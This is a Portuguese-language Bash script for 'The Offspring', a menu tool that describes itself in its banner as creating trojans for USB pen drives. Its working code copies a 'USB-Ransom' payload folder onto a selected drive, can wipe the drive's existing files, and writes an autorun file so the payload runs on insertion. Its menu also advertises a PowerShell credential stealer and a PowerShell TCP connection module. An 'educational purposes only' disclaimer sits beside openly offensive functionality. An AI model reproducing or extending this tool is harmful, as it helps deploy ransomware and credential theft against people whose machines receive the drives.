#!/bin/bash

readonly OFSPRING_FILE="/root/.f/offspring.txt"
readonly LICENSE_FILE="/root/.f/licenca.txt"
readonly SRC_DIR="/source/USB-Ransom"
readonly MEDIA_DIR="/media/newland"
readonly MENU_PROMPT="off> "
readonly MENU_BACK_OPTION="menu"
readonly MENU_EXIT_OPTION="sair"
readonly ONE_PROMPT="off/usb> "

print_file_content() {
    clear
    cat "$OFSPRING_FILE"
}

print_welcome_message() {
echo""
echo""
echo""
echo""
    echo "		============================================="
    echo "		|Bem-vindo ao The Offspring		    |"
    echo "		|O The Offspring é uma ferramenta de        | "
    echo "		|malwares que cria trojans e executavéis    |"
    echo "		|binários do MS-DOS que são colocados em    |"   
    echo "		|dispositivos de armazenamento USB pen-drive|"
    echo "		|que são compilados quando inseridos.	    |"
    echo "		============================================="
    echo "		|O The Offspring permite automatizar a confi|"
    echo "		|guração de malwares e pré-compilar arquivos|"
    echo "		|necessários, além de automatizar o processo|"
    echo "		|de mover os arquivos.			    |"
    echo "		============================================="
    echo ""
    echo ""
    echo "		---------------------------------------------"
    echo "		Essa ferramenta é somente para fins educacionais."
    echo "		O autor não é responsavél pelo que você faz com"
    echo "		essa ferramenta."
    echo "		--------------------------------------------"
    echo "		Desenvolvido por: @gb.mps7 (Instagram)"
    echo "		gabriel.mpsouza@aluno.educacao.pe.gov.br"
    echo ""
}

print_menu() {
    cat <<EOF
	Menu:

	1) Ferramentas de Flash-USB
	2) Sobre o OFFSPRING
	3) Licença

	99) Sair

EOF
}

print_modules_menu() {
    cat <<EOF

	Escolha uma opção
	para automatizar:

	1) USB-RansomWare
	2) Ladrão de Credenciais Powershell
	3) Conexão TCP Powershell

	99) Voltar

EOF
    read -p "$ONE_PROMPT" option_module
}

copy_content_to_pendrive() {
    listar_pendrives

    read -p "$ONE_PROMPT" pendrive_number

    if [ "$pendrive_number" -ge 0 ] && [ "$pendrive_number" -lt "${#pendrives[@]}" ]; then
        selected_pendrive="$MEDIA_DIR/$(basename "${pendrives[$pendrive_number]}")"

        if [ -d "$selected_pendrive" ]; then
            echo ""
            read -p "Deseja apagar os arquivos pré-existentes em $selected_pendrive? (sim/não): " delete_existing_files

            if [ "$delete_existing_files" = "sim" ]; then
                rm -r "$selected_pendrive"/*
                echo ""
                echo "Arquivos pré-existentes apagados em $selected_pendrive"
            fi

            cp -r "$SRC_DIR"/* "$selected_pendrive"
            echo ""
            echo "Conteúdo copiado para $selected_pendrive"
            echo ""
            read -p "Deseja criar um arquivo autorun.info? (sim/não): " create_autorun

            if [ "$create_autorun" = "sim" ]; then
                echo ""
                read -p "Digite o nome do arquivo principal: " main_file_name
                echo ""
                echo "OPEN=$main_file_name" > "$selected_pendrive/autorun.info"
                echo "Arquivo autorun.info criado em $selected_pendrive"
            fi
                echo ""
            read -p "Deseja voltar ao menu principal ou sair? ($MENU_BACK_OPTION/$MENU_EXIT_OPTION): " back_option
            case $back_option in
                "$MENU_BACK_OPTION")
                    return
                    ;;
                "$MENU_EXIT_OPTION")
                    echo "Saindo..."
                    exit 0
                    ;;
                *)
                    echo "Opção inválida, retornando ao menu principal."
                    return
                    ;;
            esac
        else
            echo "Pendrive inválido"
        fi
    else
        echo "Número de pendrive inválido"
    fi
}

listar_pendrives() {
    echo ""
    echo "  Selecione um pendrive:"
    echo  ""
    pendrives=("$MEDIA_DIR/"*)

    if [ ${#pendrives[@]} -eq 0 ]; then
        echo "Nenhum pendrive encontrado em $MEDIA_DIR."
        exit 1
    fi

    for i in "${!pendrives[@]}"; do
        echo "	$i) $(basename "${pendrives[$i]}")"
    done
    echo ""
}

while true; do
    print_file_content
    print_welcome_message
    print_menu

    read -p "$MENU_PROMPT" option

    case $option in
        1)
            print_modules_menu
            case $option_module in
                1)
                    copy_content_to_pendrive
                    ;;
                99)
                    ;;
                *)
                    echo "Opção inválida"
                    ;;
            esac
            ;;
        2)
            clear
            cat "$OFSPRING_FILE"
            ;;
        3)
            clear
            cat "$LICENSE_FILE"
            ;;
        99)
            echo "Saindo..."
            exit 0
            ;;
        *)
            echo "Opção inválida"
            ;;
    esac
done
